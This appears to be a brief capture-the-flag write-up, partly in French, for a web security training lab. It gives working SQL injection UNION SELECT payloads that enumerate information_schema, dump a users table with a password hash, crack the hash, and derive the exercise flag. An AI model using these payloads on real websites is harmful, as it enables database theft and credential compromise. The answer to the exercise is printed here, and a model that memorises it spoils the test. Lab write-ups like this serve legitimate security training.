/index.php?page=member

1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
5 union all select table_name,column_name from information_schema.columns

table_schema: Member_Sql_Injection
table_name: users
columns: user_id, first_name, last_name, town, country, planet, Commentaire, countersign
5 union all select 1,concat(user_id,0x3a,last_name,0x3a,first_name,0x3a,town,0x3a,country,0x3a,planet,0x3a,Commentaire,0x3a,countersign) from users
On trouve :
5:GetThe:Flag:42:42:42:Decrypt this password -> then lower all the char. Sh256 on it and it's good !:5ff9d0165b4f92b14994e5c685cdce28
Unhash 5ff9d0165b4f92b14994e5c685cdce28 to get "FortyTwo", and Sh256 "fortytwo" gives the flag:
	10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 

